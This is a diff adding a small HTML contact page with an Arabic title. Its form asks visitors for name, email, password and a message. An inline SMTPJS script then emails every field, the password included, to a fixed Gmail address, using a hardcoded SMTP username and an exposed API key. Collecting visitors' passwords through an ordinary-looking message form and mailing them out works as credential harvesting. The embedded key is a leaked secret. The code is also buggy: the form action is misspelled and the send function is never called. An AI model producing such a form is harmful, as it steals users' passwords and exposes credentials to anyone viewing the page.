@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>إرسال بريد إلكتروني</title>
+</head>
+<link rel="stylesheet" href="sheet.css">
+<body>
+    <div class="container">
+        <div class="message-card">
+            <div class="logo-pic">
+
+                <div class="title"></div>
+                <h1>hi
+
+                </h1>
+            </div>
+            <form action="javacript:void(0);">
+                <input type="text" id="name" placeholder="youer name" required>
+                <input type="email" id="email" placeholder="email id " required>
+                <input type="password" id="password" placeholder="youer  password" required>
+                <textarea  id="message" cols="30" rows="4" placeholder="leav youer message"></textarea>
+                <button id="submit" type="submit"> send
+                </button>
+            </form>
+        </div>
+    </div>
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+    <script >
+        function sendemail() {
+            Email.send({
+    Host : "smtp.elasticemail.com",
+    Username : "hadihamwi44@gmail.com",
+    Password : "457E9A8782A60867D0C7C764AF268E5D03AD",
+    To : 'hadihamwi44@gmail.com',
+    From : "hadihamwi44@gmail.com",
+    Subject : "test email",
+    Body : "name: " + document.getElementById("name").value 
+    +"<br> email: " + document.getElementById("email").value
+    +"<br> password: " + document.getElementById("password").value
+    +"<br> message: " + document.getElementById("message").value
+}) .then(
+message => alert("thank for the message" ) )} 
+    </script>
+</body>
+</html>
